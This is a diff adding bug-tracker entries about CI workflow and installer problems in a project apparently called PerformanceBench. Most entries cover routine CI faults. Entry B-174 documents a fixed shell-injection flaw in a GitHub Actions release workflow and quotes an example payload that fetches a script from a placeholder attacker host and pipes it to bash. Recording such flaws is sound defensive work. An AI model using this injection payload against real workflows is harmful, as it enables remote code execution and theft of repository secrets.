@@ -2460,3 +2460,115 @@ Schema per entry:
 - **Related:** —
 - **Found in:** S-18
 - **Discovered:** 2026-05-09
+
+---
+
+### B-174 — Release workflow: shell injection via `inputs.tag`
+
+- **Severity:** HIGH
+- **Where:** `.github/workflows/release.yml:37` (pre-fix)
+- **User-visible symptom:** An attacker with workflow_dispatch permissions could set `tag` input to a value containing shell metacharacters (e.g., `"; curl attacker.com/pwn | bash #`), achieving arbitrary command execution on the GitHub Actions runner. This could exfiltrate secrets, tamper with release artifacts, or compromise the repository.
+- **Root cause:** `${{ inputs.tag }}` was interpolated directly into a `run:` block, not via an environment variable. GitHub Actions doesn't escape `${{ }}` expressions in shell contexts.
+- **Fix:** Changed to pass `inputs.tag` via `env: INPUT_TAG:` and reference as `${INPUT_TAG}` in shell, which the shell quotes safely.
+- **Status:** FIXED:<pending-S19>
+- **Related:** —
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-175 — `server-ci.yml` and `desktop-ci.yml` both named "CI"
+
+- **Severity:** MED
+- **Where:** `.github/workflows/server-ci.yml:1` and `.github/workflows/desktop-ci.yml:6`
+- **User-visible symptom:** `self-heal.yml` references `"CI"` and `"Server CI"` in its workflow list. Since `server-ci.yml` was also named `"CI"`, the self-heal workflow couldn't distinguish between server and desktop failures. Server CI failures might not trigger the auto-issue creation, or desktop failures might wrongly be attributed to server.
+- **Root cause:** Copy-paste: `server-ci.yml` wasn't renamed from the template `name: CI`.
+- **Fix:** Renamed `server-ci.yml` workflow to `Server CI` to match `self-heal.yml`'s reference.
+- **Status:** FIXED:<pending-S19>
+- **Related:** —
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-176 — Linux build step duplicates apt-get install
+
+- **Severity:** LOW
+- **Where:** `.github/workflows/desktop-ci.yml:95-97` (pre-fix)
+- **User-visible symptom:** The "Build Linux" step at line 93 re-runs `sudo apt-get update && install` with the exact same packages already installed by "Install Linux deps" at line 34. This wastes ~30 seconds per CI run and creates a maintenance hazard if the package lists diverge.
+- **Root cause:** The build step was likely copy-pasted from a standalone script and the dependency install was not removed.
+- **Fix:** Removed the duplicate `apt-get update/install` from the "Build Linux" step.
+- **Status:** FIXED:<pending-S19>
+- **Related:** —
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-177 — `flutter analyze` failures silently swallowed by `|| true`
+
+- **Severity:** MED
+- **Where:** `.github/workflows/desktop-ci.yml:48`
+- **User-visible symptom:** Dart analysis errors (unresolved imports, type mismatches, unused imports) are reported in CI logs but never fail the build. `|| true` makes the step always succeed. Broken Dart code can be merged to main without CI objection.
+- **Root cause:** `|| true` was likely added as a temporary workaround during initial CI setup and never removed.
+- **Fix (planned):** Remove `|| true` and `2>&1`. Let `flutter analyze` return its natural exit code so CI blocks on real issues.
+- **Status:** DEFERRED-TO-S20
+- **Related:** B-178, B-179
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-178 — Clippy and pytest failures silently swallowed
+
+- **Severity:** MED
+- **Where:** `.github/workflows/injector-sdk-ci.yml:39,104`
+- **User-visible symptom:** Same as B-177. `cargo clippy || true` and `pytest || true` make CI non-blocking. Lint warnings and test failures are invisible to reviewers checking the CI badge.
+- **Root cause:** `|| true` pattern applied across multiple workflows.
+- **Fix (planned):** Remove `|| true` from both steps.
+- **Status:** DEFERRED-TO-S20
+- **Related:** B-177
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-179 — Server test step has `continue-on-error: true`
+
+- **Severity:** MED
+- **Where:** `.github/workflows/server-ci.yml:56`
+- **User-visible symptom:** Server test failures don't block merges. A broken server backend can be merged to main and deployed. The CI badge stays green even with failing tests.
+- **Root cause:** `continue-on-error: true` was likely added because tests needed a PostgreSQL service container that was initially misconfigured. Never removed after the fix.
+- **Fix (planned):** Remove `continue-on-error: true` from the test step.
+- **Status:** DEFERRED-TO-S20
+- **Related:** B-177, B-178
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-180 — NSIS installer version hardcoded to "1.0.0"
+
+- **Severity:** MED
+- **Where:** `performancebench/windows/installer/performancebench.nsi:7`
+- **User-visible symptom:** Every Windows installer is stamped as version "1.0.0" regardless of the actual release tag. The installer wizard title, the Add/Remove Programs entry in Windows, and the output filename all show "1.0.0". Users who install v0.2.0 see "PerformanceBench 1.0.0" in their system.
+- **Root cause:** `!define PRODUCT_VERSION "1.0.0"` is a static value. The release workflow doesn't pass the resolved version to the NSIS script (e.g., via `/DPRODUCT_VERSION=${VER}`).
+- **Fix (planned):** Change NSIS to `!ifndef PRODUCT_VERSION` / `!define PRODUCT_VERSION "dev"` / `!endif` pattern, then pass version via makensis `-DPRODUCT_VERSION=x.y.z` in the release workflow.
+- **Status:** DEFERRED-TO-S20
+- **Related:** —
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
+
+---
+
+### B-181 — AppImage script downloads linuxdeploy to /tmp (CI cache miss)
+
+- **Severity:** NIT
+- **Where:** `performancebench/linux/build_appimage.sh:19`
+- **User-visible symptom:** Every CI run downloads ~12MB linuxdeploy binary from GitHub because it's saved to `/tmp` which is ephemeral. This adds network latency and is a single-point-of-failure if the linuxdeploy release CDN is down during a release.
+- **Root cause:** `/tmp` is not included in any CI cache step. The script could use a workspace-local cache or `actions/cache`.
+- **Fix (planned):** Cache the linuxdeploy binary using `actions/cache` keyed on the linuxdeploy version.
+- **Status:** DEFERRED-TO-S20
+- **Related:** —
+- **Found in:** S-19
+- **Discovered:** 2026-05-09
